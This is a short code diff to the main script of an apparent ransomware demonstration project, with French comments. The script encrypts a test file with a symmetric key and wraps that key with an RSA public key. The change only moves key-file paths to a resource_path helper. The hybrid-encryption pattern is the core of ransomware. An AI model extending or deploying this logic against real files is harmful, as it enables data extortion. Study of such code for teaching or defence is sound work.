@@ -1,6 +1,11 @@
 import tkinter as tk
 from gui import RansomwareGUI
 import os
+import sys
+# Ajouter le répertoire parent au chemin de recherche des modules
+parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
+sys.path.append(parent_dir)
+from utils import resource_path
 from encryption import encrypt_file
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
@@ -14,7 +19,8 @@ def main():
             file.write("Ceci est un fichier de test.")
 
     # Charger la clé symétrique
-    symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'symmetric_key.bin')
+    symmetric_key_path = resource_path('keys/symmetric_key.bin')
+    #symmetric_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'symmetric_key.bin')
     with open(symmetric_key_path, 'rb') as key_file:
         symmetric_key = key_file.read()
 
@@ -22,7 +28,8 @@ def main():
     encrypt_file(file_path, symmetric_key)
 
     # Charger la clé publique RSA
-    public_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'public_key.pem')
+    public_key_path = resource_path('keys/public_key.pem')
+    #public_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'public_key.pem')
     with open(public_key_path, 'rb') as key_file:
         public_key = serialization.load_pem_public_key(
             key_file.read(),
@@ -40,7 +47,8 @@ def main():
     )
 
     # Sauvegarder la clé symétrique chiffrée
-    encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'encrypted_symmetric_key.bin')
+    encrypted_symmetric_key_path = resource_path('keys/encrypted_symmetric_key.bin')
+    #encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'encrypted_symmetric_key.bin')
     with open(encrypted_symmetric_key_path, 'wb') as key_file:
         key_file.write(encrypted_symmetric_key)
 
